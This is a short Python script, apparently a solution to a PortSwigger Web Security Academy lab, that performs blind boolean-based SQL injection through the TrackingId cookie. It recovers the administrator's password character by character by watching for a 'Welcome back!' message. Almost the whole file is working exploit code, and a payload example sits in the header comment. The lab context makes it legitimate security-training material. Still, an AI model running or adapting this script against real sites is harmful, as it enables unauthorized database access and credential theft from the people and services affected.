# This is a simple Python program created to solve the following lab:
# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

# Payload example:
# xyz' OR (SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 0, 1)) = 'a'--

import requests

SCHEME = "HTTPS://"
URL = "web-security-academy.net"
PATH = "/login"
SUB_DOMAIN = "INSERT SUB-DOMAIN HERE" # Change This Line With Labs Subdomain
FULL_PATH = SCHEME + SUB_DOMAIN + "." + URL + PATH
PASSWORD_LENGTH = 20
MESSAGE = "Welcome back!"
NUMS_AND_LOW_ALPHA = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
    'a', 'b', 'c', 'd', 'e', 'f', 'g',
    'h', 'i', 'j', 'k', 'l', 'm', 'n',
    'o', 'p', 'q', 'r', 's', 't', 'u',
    'v', 'w', 'x', 'y', 'z'
]

print("Program has started...")
print(f"Targetted URL: {FULL_PATH}")
print(f"Target Message: {MESSAGE}")
print(f"Assumed password length: {PASSWORD_LENGTH}")

password = ""

for i in range(1, PASSWORD_LENGTH + 1):
    for char in NUMS_AND_LOW_ALPHA:
        print(f"Checking Administrators Password... POSITION: {i} -- CHARACTER: {char}")
        blind_conditional_sqli = f"' OR (SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {i}, 1)) = '{char}'--"
        headers = {"Cookie" : "TrackingId=xyz" + blind_conditional_sqli}
        response = requests.get(FULL_PATH, headers=headers)
        if MESSAGE in response.text:
            print("Possible Match Found")
            password = f"{password}{char}"
            print(f"Password So Far: {password}")
            break
print(password)
